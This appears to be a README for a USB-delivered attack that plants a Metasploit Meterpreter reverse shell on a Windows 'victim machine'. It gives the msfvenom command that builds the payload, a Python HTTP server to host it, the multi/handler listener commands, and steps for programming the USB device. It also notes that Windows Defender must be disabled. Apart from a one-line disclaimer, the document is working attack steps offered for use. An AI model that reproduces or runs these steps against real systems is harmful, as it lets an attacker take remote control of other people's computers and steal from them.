# Metasploit Download

Throughout this tutorial I will refer to `0.0.0.0`. When you see `0.0.0.0` you should replace it with your IP address.

You must have the [metasploit-framework](https://github.com/rapid7/metasploit-framework) and python installed in order for this to work. Installed by default in Kali Linux.

Please note that Windows Defender will stop this script from running. Windows Defender must be disabled for this script to work.

## Creating Payload

This command will create a Windows executable file, encoded in base64. Make sure to replace `0.0.0.0` with your IP.

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe -o winner.exe
base64 winner.exe > winner.exe.b64
```

## Hosting Payload

This command creates a local server on your device that the victim machine can download the payload from.

```bash
python -m http.server 8888
```

## Metasploit Listener

The following is a sequence of commands to be run. This will prepare you to receive the reverse shell. Make sure to replace `0.0.0.0` with your IP.

- `msfconsole`
- `use exploit/multi/handler`
- `set payload windows/x64/meterpreter_reverse_tcp`
- `setg LHOST 0.0.0.0`
- `setg LPORT 4444`
- `exploit`


## Programming USB

Open [metasploit-download.ino](metasploit-download.ino), go to line 24, replace `0.0.0.0` with your IP, then upload your script to the USB. Insert __responsibly and legally__ please!

